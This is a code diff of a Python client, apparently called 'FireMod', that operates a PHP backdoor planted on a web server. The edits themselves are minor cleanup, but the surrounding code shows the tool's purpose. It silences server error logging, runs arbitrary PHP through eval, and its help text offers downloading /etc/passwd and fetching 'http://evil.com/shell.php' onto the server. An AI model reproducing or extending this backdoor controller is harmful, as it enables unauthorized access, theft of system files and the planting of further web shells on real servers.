@@ -8,7 +8,6 @@ import re
 import platform
 from urlparse import urlparse
 
-
 def get( t, url, p, pwd="", c="", r="https://www.google.com/search?", out=None):
         userAgent = 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36'
         fcmd = "@error_reporting(0);ini_set('error_log',NULL);ini_set('log_errors',1);ini_set('max_execution_time',0);set_time_limit(0);"
@@ -97,7 +96,6 @@ def helpm( t ):
 
 def checkpass( u, p ):
         ofc = "mojo"
-        print(ofc)
         tmp = get( "", u, p, "", "echo '"+ofc+"';")
         if ofc in tmp:
                 return True
@@ -129,7 +127,7 @@ def finput( m, t=None, f=False, url=""):
                                 sys.stdout.write("[!]: Wrong Password !   \r\n")
                                 tmpinput = finput( tmp, t, True, url)
                         else:
-                                print("[#]: Connected")
+                                print("[#]: Connected     ")
                                 return tmpinput
                         
         else:
@@ -154,7 +152,7 @@ def options( user, domain, password, pwd, url ):
  \t\t EX: #download /etc/passwdx
  #downurl\tDownload file from URL to server.
  \t\t EX: #downurl http://evil.com/shell.php output.php
- #php\t\tExecute PHP evak codes.
+ #php\t\tExecute PHP eval codes.
  \t\t EX: #php echo 'apple';""")
         
         elif "#" in tmp:
@@ -220,9 +218,6 @@ def main():
         
         options(user, domain, password, pw, burl )
 
-        
-#print( get( 'upload', url , password, "x.txt", None, "xxx.TXT" ) )
-#print( get( 'exec', url , password, "whoami && echo 'ahmed'") )
 if __name__ == "__main__":
         print(" @3Turr - FireMod ")
         print("   Please upload the php backdoor file to your web server and follow the instractions. For help enter help, exit to exit!")
@@ -230,6 +225,3 @@ if __name__ == "__main__":
             main()
         except:
             print("[!]: Exiting...")
-
-
-
